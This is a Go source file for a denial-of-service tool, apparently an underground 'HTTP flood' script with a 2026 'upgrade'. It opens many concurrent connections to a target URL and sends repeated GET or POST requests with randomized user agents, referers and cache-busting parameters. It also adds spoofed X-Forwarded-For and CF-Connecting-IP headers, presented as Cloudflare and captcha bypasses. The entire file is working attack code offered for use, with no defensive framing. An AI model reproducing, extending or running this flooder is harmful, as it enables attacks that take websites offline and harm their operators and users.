/*
Coded by RexxUs (Blackout Dominion)
Please fking code ur script by ur self, kid.

I changed the random integers range to the max of int32.
Now 386 systems should work well.

Looks like most people want to hit the url but not the host/ip.
As a result, here you are.

Upgraded 2026 - heavier payload, live stats, tighter flood loop.
*/
package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

var (
	host      = ""
	port      = "80"
	page      = ""
	mode      = ""
	abcd      = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM0123456789"
	start     = make(chan bool)
	success   int64
	errors    int64
	acceptall = []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\n",
		"Accept-Encoding: gzip, deflate, br\r\n",
		"Accept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip, deflate, br\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml\r\n",
		"Accept-Language: en-US,en;q=0.9\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: */*\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\n",
	}
	key     string
	choice  = []string{"Macintosh", "Windows", "X11"}
	choice2 = []string{"68K", "PPC", "Intel Mac OS X", "Intel Mac OS X 10_15_7", "Intel Mac OS X 13_0_0", "Intel Mac OS X 14_0"}
	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64", "Windows NT 10.0; WOW64", "Windows NT 11.0; Win64; x64"}
	choice4 = []string{"Linux i686", "Linux x86_64", "Linux aarch64", "Ubuntu; Linux x86_64"}
	choice5 = []string{"chrome", "spider", "ie", "firefox", "safari", "edge", "opera"}
	choice6 = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64", "rv:109.0"}
	spider  = []string{
		"AdsBot-Google ( http://www.google.com/adsbot.html)",
		"Baiduspider ( http://www.baidu.com/search/spider.htm)",
		"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
		"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
		"Googlebot-Image/1.0",
		"Googlebot-News",
		"Googlebot-Video/1.0",
		"bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
		"DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
		"YandexBot/3.0 (+http://yandex.com/bots)",
	}
	referers = []string{
		"https://www.google.com/search?q=",
		"https://check-host.net/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.fbi.gov/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.cia.gov/index.html",
		"https://vk.com/profile.php?auto=",
		"https://www.usatoday.com/search/results?q=",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
		"https://www.reddit.com/search/?q=",
		"https://twitter.com/search?q=",
		"https://www.linkedin.com/search/results/all/?keywords=",
		"https://www.amazon.com/s?k=",
		"https://www.wikipedia.org/wiki/Special:Search?search=",
		"https://duckduckgo.com/?q=",
	}
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func getuseragent() string {
	platform := choice[rand.Intn(len(choice))]
	var os string
	if platform == "Macintosh" {
		os = choice2[rand.Intn(len(choice2))]
	} else if platform == "Windows" {
		os = choice3[rand.Intn(len(choice3))]
	} else {
		os = choice4[rand.Intn(len(choice4))]
	}
	browser := choice5[rand.Intn(len(choice5))]
	if browser == "chrome" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		uwu := strconv.Itoa(rand.Intn(120-90)+90) + ".0." + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit
	} else if browser == "ie" {
		uwu := strconv.Itoa(rand.Intn(99)) + ".0"
		engine := strconv.Itoa(rand.Intn(99)) + ".0"
		option := rand.Intn(2)
		var token string
		if option == 1 {
			token = choice6[rand.Intn(len(choice6))] + "; "
		} else {
			token = ""
		}
		return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + os + "; " + token + "Trident/" + engine + ")"
	} else if browser == "firefox" {
		ver := strconv.Itoa(rand.Intn(120-80) + 80)
		return "Mozilla/5.0 (" + os + "; rv:" + ver + ".0) Gecko/20100101 Firefox/" + ver + ".0"
	} else if browser == "edge" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		uwu := strconv.Itoa(rand.Intn(120-90)+90) + ".0." + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit + " Edg/" + uwu
	} else if browser == "opera" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		uwu := strconv.Itoa(rand.Intn(100-80)+80) + ".0." + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit + " OPR/" + uwu
	}
	return spider[rand.Intn(len(spider))]
}

func contain(char string, x string) int {
	times := 0
	ans := 0
	for i := 0; i < len(char); i++ {
		if char[times] == x[0] {
			ans = 1
		}
		times++
	}
	return ans
}

func bypassCloudflare() string {
	return "X-Forwarded-For: " + strconv.Itoa(rand.Intn(255)) + "." + strconv.Itoa(rand.Intn(255)) + "." + strconv.Itoa(rand.Intn(255)) + "." + strconv.Itoa(rand.Intn(255)) + "\r\n" +
		"X-Real-IP: " + strconv.Itoa(rand.Intn(255)) + "." + strconv.Itoa(rand.Intn(255)) + "." + strconv.Itoa(rand.Intn(255)) + "." + strconv.Itoa(rand.Intn(255)) + "\r\n" +
		"CF-Connecting-IP: " + strconv.Itoa(rand.Intn(255)) + "." + strconv.Itoa(rand.Intn(255)) + "." + strconv.Itoa(rand.Intn(255)) + "." + strconv.Itoa(rand.Intn(255)) + "\r\n"
}

func bypassCaptcha() string {
	return "X-Requested-With: XMLHttpRequest\r\n"
}

func randString(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = abcd[rand.Intn(len(abcd))]
	}
	return string(b)
}

func flood() {
	addr := host + ":" + port
	header := ""
	if mode == "get" {
		header += " HTTP/1.1\r\nHost: "
		header += host + "\r\n"
		if os.Args[5] == "nil" {
			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
			header += "User-Agent: " + getuseragent() + "\r\n"
			header += acceptall[rand.Intn(len(acceptall))]
			header += "Referer: " + referers[rand.Intn(len(referers))] + randString(8) + "\r\n"
			header += bypassCloudflare()
			header += bypassCaptcha()
			header += "Pragma: no-cache\r\n"
		} else {
			func() {
				fi, err := os.Open(os.Args[5])
				if err != nil {
					fmt.Printf("Error: %s\n", err)
					return
				}
				defer fi.Close()
				br := bufio.NewReader(fi)
				for {
					a, _, c := br.ReadLine()
					if c == io.EOF {
						break
					}
					header += string(a) + "\r\n"
				}
			}()
		}
	} else if mode == "post" {
		data := ""
		if os.Args[5] != "nil" {
			func() {
				fi, err := os.Open(os.Args[5])
				if err != nil {
					fmt.Printf("Error: %s\n", err)
					return
				}
				defer fi.Close()
				br := bufio.NewReader(fi)
				for {
					a, _, c := br.ReadLine()
					if c == io.EOF {
						break
					}
					header += string(a) + "\r\n"
				}
			}()
		} else {
			data = "f=" + randString(32) + "&t=" + strconv.Itoa(rand.Intn(2147483647))
		}
		header += "POST " + page + " HTTP/1.1\r\nHost: " + host + "\r\n"
		header += "Connection: Keep-Alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
		header += "Accept-Encoding: gzip, deflate, br\r\n"
		header += "User-Agent: " + getuseragent() + "\r\n"
		header += bypassCloudflare()
		header += "\r\n" + data + "\r\n"
	}
	var s net.Conn
	var err error
	<-start
	for {
		if port == "443" {
			cfg := &tls.Config{
				InsecureSkipVerify: true,
				ServerName:         host,
				MinVersion:         tls.VersionTLS12,
			}
			s, err = tls.Dial("tcp", addr, cfg)
		} else {
			s, err = net.DialTimeout("tcp", addr, 5*time.Second)
		}
		if err != nil {
			atomic.AddInt64(&errors, 1)
			continue
		}
		// bigger write buffer
		if tc, ok := s.(*net.TCPConn); ok {
			tc.SetWriteBuffer(128 * 1024)
			tc.SetNoDelay(true)
		}
		for i := 0; i < 500; i++ {
			request := ""
			if mode == "get" {
				request += "GET " + page + key
				request += strconv.Itoa(rand.Intn(2147483647)) + randString(12)
			}
			request += header + "\r\n"
			n, werr := s.Write([]byte(request))
			if werr != nil || n == 0 {
				atomic.AddInt64(&errors, 1)
				break
			}
			atomic.AddInt64(&success, 1)
		}
		s.Close()
	}
}

func statusPrinter(limit int) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	startTime := time.Now()
	for range ticker.C {
		s := atomic.LoadInt64(&success)
		e := atomic.LoadInt64(&errors)
		elapsed := int(time.Since(startTime).Seconds())
		remaining := limit - elapsed
		if remaining < 0 {
			remaining = 0
		}
		fmt.Printf("\r[+] Sent: %d | Errors: %d | Elapsed: %ds | Left: %ds   ", s, e, elapsed, remaining)
		os.Stdout.Sync()
		if remaining <= 0 {
			return
		}
	}
}

func main() {
	fmt.Println("\r\n'||  ||`   ||      ||                '||''''| '||`                   ||` ")
	fmt.Println(" ||  ||    ||      ||                 ||  .    ||                    ||  ")
	fmt.Println(" ||''||  ''||''  ''||''  '||''|, ---  ||''|    ||  .|''|, .|''|, .|''||  ")
	fmt.Println(" ||  ||    ||      ||     ||  ||      ||       ||  ||  || ||  || ||  ||  ")
	fmt.Println(".||  ||.   `|..'   `|..'  ||..|'     .||.     .||. `|..|' `|..|' `|..||. ")
	fmt.Println("                          ||                                             ")
	fmt.Println("                         .||                     Golang version 2.0      ")
	fmt.Println("                                                        C0DED BY RexxUs")
	fmt.Println("==========================================================================")
	fmt.Println(">>> 2026 UPGRADE - heavier flood + live stats")
	if len(os.Args) != 6 {
		fmt.Println("Post Mode will use header.txt as data")
		fmt.Println("If you are using linux please run 'ulimit -n 999999' first!!!")
		fmt.Println("Usage: ", os.Args[0], "<url> <threads> <get/post> <seconds> <header.txt/nil>")
		os.Exit(1)
	}
	u, err := url.Parse(os.Args[1])
	if err != nil {
		fmt.Println("Please input a correct url")
		os.Exit(1)
	}
	tmp := strings.Split(u.Host, ":")
	host = tmp[0]
	if u.Scheme == "https" {
		port = "443"
	} else {
		port = u.Port()
	}
	if port == "" {
		port = "80"
	}
	page = u.Path
	if page == "" {
		page = "/"
	}
	if os.Args[3] != "get" && os.Args[3] != "post" {
		fmt.Println("Wrong mode, Only can use \"get\" or \"post\"")
		os.Exit(1)
	}
	mode = os.Args[3]
	threads, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Threads should be a integer")
		os.Exit(1)
	}
	limit, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("limit should be a integer")
		os.Exit(1)
	}
	if contain(page, "?") == 0 {
		key = "?"
	} else {
		key = "&"
	}

	for i := 0; i < threads; i++ {
		time.Sleep(time.Microsecond * 50)
		go flood()
		fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
		os.Stdout.Sync()
	}
	fmt.Println("\nFlood will end in " + os.Args[4] + " seconds.")
	close(start)
	go statusPrinter(limit)
	time.Sleep(time.Duration(limit) * time.Second)
	fmt.Printf("\n[+] Final → Sent: %d | Errors: %d\n", atomic.LoadInt64(&success), atomic.LoadInt64(&errors))
}
